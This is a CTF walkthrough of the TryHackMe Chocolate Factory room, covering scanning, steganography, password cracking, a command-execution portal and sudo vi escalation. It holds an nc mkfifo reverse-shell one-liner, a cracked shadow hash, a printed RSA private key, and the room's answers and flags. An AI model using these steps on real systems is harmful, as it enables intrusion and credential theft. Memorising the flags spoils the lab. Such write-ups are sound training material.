## Index

1. [Setup](#setup)
2. [Reconnaissance](#reconnaissance)
3. [Gaining Access](#gaining-access)
4. [Privilege Escalation](#privilege-escalation)
5. [Conclusion](#conclusion)

## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using `openvpn` to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

As usual, we start with some basic enumeration:
```shell-session
$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -r 1-65535 -- -oN rustscan_port_scan.txt
PORT    STATE SERVICE    REASON
21/tcp  open  ftp        syn-ack
22/tcp  open  ssh        syn-ack
80/tcp  open  http       syn-ack
100/tcp open  newacct    syn-ack
101/tcp open  hostname   syn-ack
102/tcp open  iso-tsap   syn-ack
103/tcp open  gppitnp    syn-ack
104/tcp open  acr-nema   syn-ack
105/tcp open  csnet-ns   syn-ack
106/tcp open  pop3pw     syn-ack
107/tcp open  rtelnet    syn-ack
108/tcp open  snagas     syn-ack
109/tcp open  pop2       syn-ack
110/tcp open  pop3       syn-ack
111/tcp open  rpcbind    syn-ack
112/tcp open  mcidas     syn-ack
113/tcp open  ident      syn-ack
114/tcp open  audionews  syn-ack
115/tcp open  sftp       syn-ack
116/tcp open  ansanotify syn-ack
117/tcp open  uucp-path  syn-ack
118/tcp open  sqlserv    syn-ack
119/tcp open  nntp       syn-ack
120/tcp open  cfdptkt    syn-ack
121/tcp open  erpc       syn-ack
122/tcp open  smakynet   syn-ack
123/tcp open  ntp        syn-ack
124/tcp open  ansatrader syn-ack
125/tcp open  locus-map  syn-ack
```

Woah, thats a lot of ports! Well, nothing to it, let's see what services they're running:
```shell-session
# First a service scan of ports 21,22,80:
$ rustscan -b 4500 -a 10.10.21.83 --ulimit 5000 -t 2000 -p 21,22,80 -- -sV -sC -oN rustscan_service_scan_1.txt
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.5.201
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuEAWoQHbW+vehIUZLTiJyXKjUAAJP0sgW/P0LHVaf4C5+1oEBXcDBBZC7SoL6MTMYn8zlEfhCbjQb7A/Yf2IxLzU5f35yuhEbWEvYmuP4PmBB04CJdDItU0xwAbGsufyzZ6td6LKm+oim8xJn/lVTeykVZTASF9iuY9tqwA933AfjqKlNByj82TAmlVkQ93bq+e7Gu/pRkSn++RkIUd4f8ogmLLusEh+vbGkZDj4UdwTIZbOSeuS4oz/umpkJPhekGVoyzjPMRIq9cwdeKIVRwUNbp4BoJjYKjbCC9YY8u/7O6lhtwo4uAp7Q9PfRRCiCpVimm6kIgBmgqqKbueDl
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYfNs0w6oOdzMM4B2JyB5pWr1qq9oB+xF0Voyn4gBYEGPC9+dqPudYagioH1ArjIHZFF0G24rt7L/6x1OPJSts=
|   256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAwurtl1AFxJU7cHOfbCNr34YoTmAVnVUIXt4QHPD1B2
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


## Scanning the rest...
$ rustscan -b 4500 -a 10.10.21.83 --ulimit 5000 -t 2000 -r 100-125 -- -sV -sC -oN rustscan_service_scan.txt
Nothing :3
```

After messing about a bit with `nc` and trying to connect to some of the ports in the range 100-125, I quickly found that many of them give the following message:
```shell-session
$ nc 10.10.21.83 110
"Welcome to chocolate room!! 
    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
I hope you wont drown Augustus"
```

HOWEVER, port 113 has something different for us:
```shell-session
nc 10.10.21.83 113
http://localhost/key_rev_key <- You will find the key here!!!
```
```shell-session
$ file key_rev_key 
key_rev_key: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped

$ chmod +x key_rev_key
$ strings key_rev_key
...
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
...
```

Well lads, there's the key. Pretty easy, huh?

> Enter the key you found!
> 
> Answer: `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`

Let's take a look at what the ports: 21,22 and 80 have to offer. I'll start with the ftp server:
```shell-session
$ ftp 10.10.21.83
Connected to 10.10.21.83.
220 (vsFTPd 3.0.3)
Name (10.10.21.83:kali): anonymous
Password: <BLANK>
230 Login successful.
ftp> echo "YAY anon login works!"
ftp> ls
229 Entering Extended Passive Mode (|||60645|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
ftp> bye
221 Goodbye.
```

Here's the image we got:
![](gum-room.jpg)

Let's try and give using `steghide` (with an empty passphrase) a try:
```shell-session
$ steghide extract -sf gum_room.jpg
Enter passphrase: 
wrote extracted data to "b64.txt".

$ head b64.txt                                                                                                    
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
```

Since it's base64, let's try to decode it:
```shell-session
$ base64 -d b64.txt 
...
...
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

Yep, looks like it's a shadow file. Let's let `john` take care of it for us:
```shell-session
$ cat hash.txt              
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::

$ john --format=sha512crypt --wordlist=/usr/share/seclists/Passwords/rockyou.txt hash.txt
...
cn7824           (charlie)
...
```

> What is Charlie's password?
> 
> Answer: `cn7824`

## Gaining Access

After trying to log into the `ssh` service using these credentials, it seems that they are meant to be used on the login portal at port 80:
![](port-80.png)

Once logged in, we're greeted with the following:
![](cmd-exec.png)

Let's get a reverse shell :)
```shell-session
## On our machine:
$ nc -nvlp 4444
```

I'll use a simple `nc mkfifo` reverse shell payload:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.11.5.201 4444 >/tmp/f
```

Let's check what charlie's got for us:
```shell-session
www-data@chocolate-factory:/var/www/html$ ls -la /home/charlie
total 40
drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
www-data@chocolate-factory:/var/www/html$ file /home/charlie/teleport*
/home/charlie/teleport:     PEM RSA private key
/home/charlie/teleport.pub: OpenSSH RSA public key
```

I'll `cat` this stuff and paste to a file on my sys, but here's the contents:

`teleport`:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

`teleport.pub`:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhp2s9zdSH3xFgOtnwJQEOBYsQ1TJsXrSUyT1hA4ENH6Cm5FbUDMvXYrfn8yLdXC2nQ1LCaVLuFrjL2y/aQ9e/yUU6YuLUVXaGqVA8vD+6ecQXBRsvgoGoF6YgN59XmnEyYKqqC4lciTOSUAhc1iF/EuvxwFL8cmiH/uqYuqsOhc2HBiMHfOCi/tFS2TXkm/XUPQi2zKvnim9iEJCB2iitTuXjYRklrIiiYcqifWOSh93X+hh84HCDPok6U0fWMUmjIhmDY6YSGdKNSW1n2ZLOZDK/czgA5FCjdl4tv7NudInJwQRFo5s+VvR1HLcqg3v2W352H6NKD90z9Nhh7kvj charlie@chocolate-factory
```

We can now use `ssh` to log in as charlie using this stuff:
```shell-session
$ chmod 600 teleport
$ ssh -l charlie -i teleport 10.10.237.255
charlie@chocolate-factory:/$
charlie@chocolate-factory:/$ cd /home/charlie
charlie@chocolate-factory:/home/charlie$ ls
teleport  teleport.pub	user.txt
charlie@chocolate-factory:/home/charlie$ cat user.txt 
flag{cd5509042371b34e4826e4838b522d2e}
```

> Enter the user flag
> 
> Answer: `flag{cd5509042371b34e4826e4838b522d2e}`

## Privilege Escalation

Let's see what charlie can do:
```shell-session
charlie@chocolate-factory:/home/charlie$ uname -a
Linux chocolate-factory 4.15.0-115-generic #116-Ubuntu SMP Wed Aug 26 14:04:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

charlie@chocolate-factory:/home/charlie$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="18.04.5 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.5 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
charlie@chocolate-factory:/home/charlie$ cat /etc/issue      
Ubuntu 18.04.5 LTS \n \l

charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

OKAY, so we have `vi` that we can execute with sudo privs and no passwords. It's quite simple to use `vi` to get the root flag:
```shell-session
charlie@chocolate-factory:/home/charlie$ sudo vi

<VI COMMANDS :P>
:!whoami
root

:!ls /root
root.py

:!cat /root/root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

We can use the key from the first question to decode this... _encrypted mess_:
```py
from cryptography.fernet import Fernet
import pyfiglet
key=b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
f=Fernet(key)
encrypted_mess='gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

Running the program gets us the root flag:
```shell-session
$ python3 root_program.py
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec59161d338fef787fcb4e296b42124}
```

> Enter the root flag
> 
> Answer: `flag{cec59161d338fef787fcb4e296b42124}`


## Conclusion
If this writeup helps, please consider following me on [github](https://github.com/NovusEdge) and/or dropping a star on the repository: https://github.com/NovusEdge/thm-writeups

Also, I really wanted to put this meme in but I could not find a proper place for it, so here you go :)

![](meme.jpeg)

---

- Author: Aliasgar Khimani
- Room: [Chocolate Factory](https://tryhackme.com/room/chocolatefactory)
